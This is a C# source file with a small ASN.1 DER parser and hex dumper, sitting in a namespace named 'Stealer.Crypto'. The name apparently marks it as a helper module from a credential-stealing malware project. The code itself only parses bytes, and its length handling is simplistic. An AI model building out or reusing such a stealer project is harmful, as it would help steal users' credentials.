using System;
using System.Collections.Generic;

namespace Stealer.Crypto
{
    public class Asn1Der
    {
        public Asn1DerObject Parse(byte[] toParse)
        {
            Asn1DerObject asn1DerObject = new Asn1DerObject();
            for (int i = 0; i < toParse.Length; i++)
            {
                Type type = (Type)toParse[i];
                Type type2 = type;
                switch (type2)
                {
                    case Type.Integer:
                    {
                        asn1DerObject.Objects.Add(new Asn1DerObject
                        {
                            ObjectType = Type.Integer,
                            Length = (int)toParse[i + 1]
                        });
                        byte[] array = new byte[(int)toParse[i + 1]];
                        int length = (i + 2 + (int)toParse[i + 1] > toParse.Length) ? (toParse.Length - (i + 2)) : ((int)toParse[i + 1]);
                        Array.Copy(toParse, i + 2, array, 0, length);
                        Asn1DerObject[] array2 = asn1DerObject.Objects.ToArray();
                        asn1DerObject.Objects[array2.Length - 1].Data = array;
                        i = i + 1 + asn1DerObject.Objects[array2.Length - 1].Length;
                        break;
                    }
                    case (Type)3:
                    case (Type)5:
                        break;
                    case Type.OctetString:
                    {
                        asn1DerObject.Objects.Add(new Asn1DerObject
                        {
                            ObjectType = Type.OctetString,
                            Length = (int)toParse[i + 1]
                        });
                        byte[] array3 = new byte[(int)toParse[i + 1]];
                        int length2 = (i + 2 + (int)toParse[i + 1] > toParse.Length) ? (toParse.Length - (i + 2)) : ((int)toParse[i + 1]);
                        Array.Copy(toParse, i + 2, array3, 0, length2);
                        Asn1DerObject[] array4 = asn1DerObject.Objects.ToArray();
                        asn1DerObject.Objects[array4.Length - 1].Data = array3;
                        i = i + 1 + asn1DerObject.Objects[array4.Length - 1].Length;
                        break;
                    }
                    case Type.ObjectIdentifier:
                    {
                        asn1DerObject.Objects.Add(new Asn1DerObject
                        {
                            ObjectType = Type.ObjectIdentifier,
                            Length = (int)toParse[i + 1]
                        });
                        byte[] array5 = new byte[(int)toParse[i + 1]];
                        int length3 = (i + 2 + (int)toParse[i + 1] > toParse.Length) ? (toParse.Length - (i + 2)) : ((int)toParse[i + 1]);
                        Array.Copy(toParse, i + 2, array5, 0, length3);
                        Asn1DerObject[] array6 = asn1DerObject.Objects.ToArray();
                        asn1DerObject.Objects[array6.Length - 1].Data = array5;
                        i = i + 1 + asn1DerObject.Objects[array6.Length - 1].Length;
                        break;
                    }
                    default:
                        if (type2 == Type.Sequence)
                        {
                            bool flag = asn1DerObject.Length == 0;
                            byte[] array7;
                            if (flag)
                            {
                                asn1DerObject.ObjectType = Type.Sequence;
                                asn1DerObject.Length = toParse.Length - (i + 2);
                                array7 = new byte[asn1DerObject.Length];
                            }
                            else
                            {
                                asn1DerObject.Objects.Add(new Asn1DerObject
                                {
                                    ObjectType = Type.Sequence,
                                    Length = (int)toParse[i + 1]
                                });
                                array7 = new byte[(int)toParse[i + 1]];
                            }
                            int length4 = (array7.Length > toParse.Length - (i + 2)) ? (toParse.Length - (i + 2)) : array7.Length;
                            Array.Copy(toParse, i + 2, array7, 0, length4);
                            asn1DerObject.Objects.Add(this.Parse(array7));
                            i = i + 1 + (int)toParse[i + 1];
                        }
                        break;
                }
            }
            return asn1DerObject;
        }

        public enum Type
        {
            Sequence = 48,
            Integer = 2,
            OctetString = 4,
            ObjectIdentifier = 6
        }
    }

    public class Asn1DerObject
    {
        public Asn1Der.Type ObjectType { get; set; }
        public int Length { get; set; }
        public List<Asn1DerObject> Objects { get; }
        public byte[] Data { get; set; }

        public Asn1DerObject()
        {
            this.Objects = new List<Asn1DerObject>();
        }

        public override string ToString()
        {
            var sb = new System.Text.StringBuilder();
            var dataSb = new System.Text.StringBuilder();
            
            switch (this.ObjectType)
            {
                case Asn1Der.Type.Integer:
                    if (this.Data != null)
                    {
                        foreach (byte b in this.Data)
                            dataSb.AppendFormat("{0:X2}", b);
                        sb.AppendLine($"\tINTEGER {dataSb}");
                    }
                    break;
                case Asn1Der.Type.OctetString:
                    if (this.Data != null)
                    {
                        foreach (byte b in this.Data)
                            dataSb.AppendFormat("{0:X2}", b);
                        sb.AppendLine($"\tOCTETSTRING {dataSb}");
                    }
                    break;
                case Asn1Der.Type.ObjectIdentifier:
                    if (this.Data != null)
                    {
                        foreach (byte b in this.Data)
                            dataSb.AppendFormat("{0:X2}", b);
                        sb.AppendLine($"\tOBJECTIDENTIFIER {dataSb}");
                    }
                    break;
                case Asn1Der.Type.Sequence:
                    sb.AppendLine("SEQUENCE {");
                    break;
            }

            foreach (var obj in this.Objects)
            {
                sb.Append(obj);
            }

            if (this.ObjectType == Asn1Der.Type.Sequence)
            {
                sb.AppendLine("}");
            }

            return sb.ToString();
        }
    }
}
